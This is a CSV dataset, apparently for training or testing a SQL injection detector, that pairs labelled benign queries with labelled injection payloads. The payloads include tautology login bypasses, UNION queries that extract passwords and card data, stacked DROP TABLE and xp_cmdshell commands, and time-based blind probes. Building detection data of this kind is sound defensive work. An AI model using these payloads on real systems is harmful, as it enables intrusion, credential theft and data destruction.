query,label,category,description
"SELECT * FROM users;",0,simple_select,"Basic table scan"
"SELECT * FROM products;",0,simple_select,"Basic table scan"
"SELECT * FROM orders;",0,simple_select,"Basic table scan"
"SELECT id, name FROM users;",0,simple_select,"Column subset"
"SELECT user_id, email, created_at FROM users;",0,simple_select,"Multiple columns"
"SELECT * FROM users WHERE id = 1;",0,simple_where,"Simple ID lookup"
"SELECT * FROM users WHERE id = 42;",0,simple_where,"Simple ID lookup"
"SELECT * FROM products WHERE product_id = 1337;",0,simple_where,"Simple ID lookup"
"SELECT * FROM users WHERE status = 'active';",0,simple_where,"String equality"
"SELECT * FROM orders WHERE status = 'pending';",0,simple_where,"String equality"
"SELECT * FROM products WHERE is_active = 1;",0,simple_where,"Boolean check"
"SELECT * FROM users WHERE email = 'john@example.com';",0,simple_where,"Email lookup"
"SELECT COUNT(*) FROM users;",0,aggregate,"Simple count"
"SELECT COUNT(*) FROM orders;",0,aggregate,"Simple count"
"SELECT SUM(total) FROM orders;",0,aggregate,"Sum aggregate"
"SELECT AVG(price) FROM products;",0,aggregate,"Average aggregate"
"SELECT MAX(created_at) FROM users;",0,aggregate,"Max aggregate"
"SELECT MIN(price) FROM products;",0,aggregate,"Min aggregate"
"SELECT * FROM users ORDER BY created_at DESC;",0,order_by,"Order by date"
"SELECT * FROM products ORDER BY price ASC;",0,order_by,"Order by price"
"SELECT * FROM users LIMIT 10;",0,limit,"Simple limit"
"SELECT * FROM products LIMIT 100;",0,limit,"Simple limit"
"SELECT * FROM users ORDER BY id DESC LIMIT 5;",0,order_limit,"Order with limit"
"SELECT DISTINCT status FROM orders;",0,distinct,"Distinct values"
"SELECT DISTINCT country FROM users;",0,distinct,"Distinct values"
"SELECT * FROM users WHERE created_at > '2024-01-01';",0,date_compare,"Date comparison"
"SELECT * FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-12-31';",0,date_compare,"Date range"
"SELECT * FROM products WHERE price > 100;",0,numeric_compare,"Numeric comparison"
"SELECT * FROM products WHERE price BETWEEN 50 AND 200;",0,numeric_compare,"Numeric range"
"SELECT * FROM users WHERE status IN ('active', 'verified');",0,in_clause,"IN clause"
"SELECT * FROM orders WHERE status IN ('pending', 'processing', 'shipped');",0,in_clause,"IN clause"
"SELECT * FROM users WHERE email IS NOT NULL;",0,null_check,"Not null check"
"SELECT * FROM orders WHERE coupon_id IS NULL;",0,null_check,"Null check"
"SELECT * FROM users WHERE status = 'active' AND country = 'US';",0,multi_condition,"AND condition"
"SELECT * FROM products WHERE category_id = 5 AND is_active = 1;",0,multi_condition,"AND condition"
"SELECT * FROM users WHERE status = 'active' OR status = 'pending';",0,multi_condition,"OR condition"
"SELECT * FROM users u JOIN orders o ON u.id = o.user_id;",0,join,"Simple join"
"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;",0,join,"Join with columns"
"SELECT * FROM products p LEFT JOIN reviews r ON p.id = r.product_id;",0,join,"Left join"
"SELECT u.email, COUNT(o.id) FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.email;",0,group_by,"Group by with join"
"SELECT status, COUNT(*) FROM orders GROUP BY status;",0,group_by,"Simple group by"
"SELECT category_id, AVG(price) FROM products GROUP BY category_id;",0,group_by,"Group by with aggregate"
"SELECT * FROM users WHERE email LIKE '%@gmail.com';",0,like,"LIKE pattern"
"SELECT * FROM products WHERE name LIKE 'iPhone%';",0,like,"LIKE pattern"
"SELECT * FROM users WHERE name LIKE '%Smith%';",0,like,"LIKE pattern"
"INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');",0,insert,"Simple insert"
"INSERT INTO orders (user_id, total, status) VALUES (1, 99.99, 'pending');",0,insert,"Insert with values"
"UPDATE users SET status = 'inactive' WHERE id = 5;",0,update,"Simple update"
"UPDATE products SET price = 29.99 WHERE id = 100;",0,update,"Price update"
"UPDATE orders SET status = 'shipped' WHERE id = 42;",0,update,"Status update"
"DELETE FROM sessions WHERE expired_at < NOW();",0,delete,"Delete expired"
"DELETE FROM cart_items WHERE cart_id = 15;",0,delete,"Delete by ID"
"SELECT 1;",0,minimal,"Minimal query"
"SELECT NOW();",0,minimal,"Get current time"
"SELECT VERSION();",0,minimal,"Version check"
"SELECT DATABASE();",0,minimal,"Database name"
"SELECT * FROM users WHERE id = 1 AND 1=1;",0,edge_case,"Looks suspicious but benign - valid AND"
"SELECT * FROM products WHERE name = 'OR Gate Circuit Board';",0,edge_case,"Product name contains OR"
"SELECT * FROM products WHERE name = 'SELECT All Items Bundle';",0,edge_case,"Product name contains SELECT"
"SELECT * FROM products WHERE sku = 'UNION-JACK-FLAG-001';",0,edge_case,"SKU contains UNION"
"SELECT * FROM tickets WHERE subject = 'Help -- urgent issue';",0,edge_case,"Comment-like in string"
"SELECT * FROM reviews WHERE text = 'It''s the best product!';",0,edge_case,"Escaped quote"
"SELECT * FROM users WHERE name = 'O''Brien';",0,edge_case,"Irish name with quote"
"SELECT * FROM users WHERE bio = 'I love coding -- especially SQL!';",0,edge_case,"Double dash in content"
"SELECT * FROM products WHERE description LIKE '%1=1%';",0,edge_case,"Contains 1=1 in string"
"SELECT * FROM comments WHERE content = 'DROP everything and buy this!';",0,edge_case,"Contains DROP"
"SELECT * FROM users WHERE id = 1 OR id = 2 OR id = 3;",0,edge_case,"Multiple OR (valid)"
"SELECT * FROM users WHERE status = 'active' -- this is a comment;",0,edge_case,"Valid SQL comment"
"SELECT * FROM products WHERE category = 'Sleep & Bedding';",0,edge_case,"Ampersand in value"
"SELECT u.*, (SELECT COUNT(*) FROM orders WHERE user_id = u.id) FROM users u;",0,subquery,"Correlated subquery"
"SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 100);",0,subquery,"Subquery in IN"
"SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products);",0,subquery,"Subquery comparison"
"' OR '1'='1",1,tautology,"Classic tautology"
"' OR 1=1--",1,tautology,"Tautology with comment"
"' OR 1=1#",1,tautology,"Tautology with hash comment"
"' OR 'x'='x",1,tautology,"String tautology"
"' OR ''='",1,tautology,"Empty string tautology"
"1' OR '1'='1",1,tautology,"Numeric prefix tautology"
"admin'--",1,tautology,"Username bypass"
"admin' --",1,tautology,"Username bypass with space"
"admin'#",1,tautology,"Username bypass hash"
"' OR 1=1 OR '",1,tautology,"Double OR tautology"
"') OR ('1'='1",1,tautology,"Parenthesis tautology"
"') OR 1=1--",1,tautology,"Parenthesis tautology comment"
"' OR 1=1/*",1,tautology,"Block comment"
"1 OR 1=1",1,tautology,"Simple numeric OR"
"' OR 'a'='a",1,tautology,"Letter tautology"
"SELECT * FROM users WHERE id = 1 OR 1=1;",1,tautology_full,"Full query with tautology"
"SELECT * FROM users WHERE username = 'admin' OR '1'='1';",1,tautology_full,"Full query string tautology"
"SELECT * FROM users WHERE id = '' OR 1=1 -- '';",1,tautology_full,"Empty string with tautology"
"' UNION SELECT NULL--",1,union,"Basic UNION probe"
"' UNION SELECT NULL,NULL--",1,union,"Two column UNION"
"' UNION SELECT NULL,NULL,NULL--",1,union,"Three column UNION"
"' UNION SELECT 1,2,3--",1,union,"Numeric UNION"
"' UNION SELECT 1,2,3,4,5--",1,union,"Five column UNION"
"' UNION SELECT username,password FROM users--",1,union,"Credential extraction"
"' UNION SELECT @@version--",1,union,"Version extraction"
"' UNION ALL SELECT 1,2,3--",1,union,"UNION ALL"
"' UNION SELECT table_name FROM information_schema.tables--",1,union,"Schema extraction"
"' UNION SELECT column_name FROM information_schema.columns--",1,union,"Column extraction"
"' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",1,union,"Credential concat"
"' UNION SELECT 1,user(),database()--",1,union,"Function extraction"
"1' UNION SELECT * FROM users--",1,union,"Full table extraction"
"' UNION SELECT credit_card,cvv,expiry FROM payments--",1,union,"Sensitive data extraction"
"SELECT * FROM users WHERE id = 1 UNION SELECT username,password,null FROM admins--",1,union_full,"Full UNION injection"
"SELECT * FROM products WHERE id = '' UNION SELECT 1,2,3,4,5--",1,union_full,"Full UNION with columns"
"'; DROP TABLE users--",1,stacked,"Drop table"
"'; DROP TABLE orders--",1,stacked,"Drop table"
"'; DROP DATABASE production--",1,stacked,"Drop database"
"'; DELETE FROM users--",1,stacked,"Delete all users"
"'; DELETE FROM users WHERE 1=1--",1,stacked,"Delete with tautology"
"'; TRUNCATE TABLE sessions--",1,stacked,"Truncate table"
"'; INSERT INTO users VALUES('hacker','hacked@evil.com','admin')--",1,stacked,"Insert admin"
"'; UPDATE users SET password='hacked' WHERE username='admin'--",1,stacked,"Update password"
"'; UPDATE users SET role='admin' WHERE id=5--",1,stacked,"Privilege escalation"
"1; DROP TABLE products--",1,stacked,"Numeric prefix drop"
"'; EXEC xp_cmdshell('dir')--",1,stacked,"Command execution"
"'; EXEC xp_cmdshell('net user hacker password /add')--",1,stacked,"Add user command"
"'; SHUTDOWN--",1,stacked,"Shutdown database"
"'; ALTER TABLE users ADD hacked INT--",1,stacked,"Alter table"
"'; CREATE TABLE backdoor(cmd TEXT)--",1,stacked,"Create backdoor table"
"' AND SLEEP(5)--",1,time_blind,"Time-based blind"
"' AND SLEEP(10)--",1,time_blind,"Time-based blind 10s"
"1' AND SLEEP(5)--",1,time_blind,"Numeric time blind"
"' OR SLEEP(5)--",1,time_blind,"OR time blind"
"'; WAITFOR DELAY '0:0:5'--",1,time_blind,"MSSQL waitfor"
"'; WAITFOR DELAY '0:0:10'--",1,time_blind,"MSSQL waitfor 10s"
"' AND BENCHMARK(10000000,SHA1('test'))--",1,time_blind,"MySQL benchmark"
"' AND (SELECT SLEEP(5))--",1,time_blind,"Subquery sleep"
"1' AND IF(1=1,SLEEP(5),0)--",1,time_blind,"Conditional sleep"
"' OR IF(1=1,SLEEP(5),0)--",1,time_blind,"OR conditional sleep"
"' AND pg_sleep(5)--",1,time_blind,"PostgreSQL sleep"
"'; SELECT pg_sleep(5)--",1,time_blind,"PostgreSQL sleep stacked"
"' AND 1=1--",1,boolean_blind,"Boolean true"
"' AND 1=2--",1,boolean_blind,"Boolean false"
"' AND 'a'='a'--",1,boolean_blind,"String boolean true"
"' AND 'a'='b'--",1,boolean_blind,"String boolean false"
"' AND SUBSTRING(@@version,1,1)='5'--",1,boolean_blind,"Version probe"
"' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",1,boolean_blind,"ASCII extraction"
"' AND (SELECT COUNT(*) FROM users)>0--",1,boolean_blind,"Count probe"
